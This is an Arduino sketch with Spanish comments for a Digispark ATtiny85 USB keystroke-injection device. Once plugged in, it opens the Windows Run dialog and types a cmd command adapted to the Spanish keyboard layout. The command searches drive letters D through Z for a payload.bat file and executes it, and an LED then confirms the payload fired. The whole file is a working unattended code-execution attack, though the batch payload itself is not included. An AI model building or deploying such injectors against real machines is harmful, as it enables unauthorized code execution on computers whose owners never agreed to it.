#include "DigiKeyboard.h"

// LED integrado: Pin 1 para Digispark Modelo A (rev 1/2), Pin 0 para Modelo B
#define LED_PIN 1

void setup() {
  pinMode(LED_PIN, OUTPUT);
}

void loop() {
  // 1. Espera de enumeracion con parpadeo del LED (~4 segundos)
  // Permite que Windows reconozca el ATtiny85 y monte el almacenamiento masivo
  for (int i = 0; i < 4; i++) {
    digitalWrite(LED_PIN, HIGH);
    DigiKeyboard.delay(500);
    digitalWrite(LED_PIN, LOW);
    DigiKeyboard.delay(500);
  }

  // 2. Abrir Ejecutar (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(700);

  // 3. Construir y enviar el comando adaptado al teclado en espanol
  // En layout ES: 
  //   '/' se produce con Shift + 7
  //   '"' se produce con Shift + 2
  //   '(' se produce con Shift + 8
  //   ')' se produce con Shift + 9
  //   ':' se produce con Shift + . (keycode 0x37)
  //   '&' se produce con Shift + 6
  // Se usa '/' como separador de ruta compatible con CMD y se lanza via 'call' para ejecucion directa y cierre limpio.
  // Comando resultante en el host:
  // cmd /c "for %d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist %d:/payload.bat (call %d:/payload.bat & exit)"

  // "cmd "
  DigiKeyboard.print("cmd ");

  // Barra '/' -> Shift + 7
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);

  // "c "
  DigiKeyboard.print("c ");

  // Comilla doble '"' -> Shift + 2
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);

  // "for %d in "
  DigiKeyboard.print("for %d in ");

  // Parentesis apertura '(' -> Shift + 8
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);

  // Unidades de disco
  DigiKeyboard.print("D E F G H I J K L M N O P Q R S T U V W X Y Z");

  // Parentesis cierre ')' -> Shift + 9
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);

  // " do if exist %d"
  DigiKeyboard.print(" do if exist %d");

  // Dos puntos ':' -> Shift + . (0x37)
  DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT);

  // Barra '/' -> Shift + 7
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);

  // "payload.bat "
  DigiKeyboard.print("payload.bat ");

  // Parentesis apertura '(' -> Shift + 8
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);

  // "call %d"
  DigiKeyboard.print("call %d");

  // Dos puntos ':' -> Shift + . (0x37)
  DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT);

  // Barra '/' -> Shift + 7
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);

  // "payload.bat "
  DigiKeyboard.print("payload.bat ");

  // Ampersand '&' -> Shift + 6
  DigiKeyboard.sendKeyStroke(KEY_6, MOD_SHIFT_LEFT);

  // " exit"
  DigiKeyboard.print(" exit");

  // Parentesis cierre ')' -> Shift + 9
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);

  // Comilla doble cierre '"' -> Shift + 2
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);

  // 4. Ejecutar el payload completo
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // 5. Encender LED fijo: confirmacion de que el payload fue disparado
  digitalWrite(LED_PIN, HIGH);

  // Ciclo infinito pasivo para evitar re-ejecucion
  for (;;) {}
}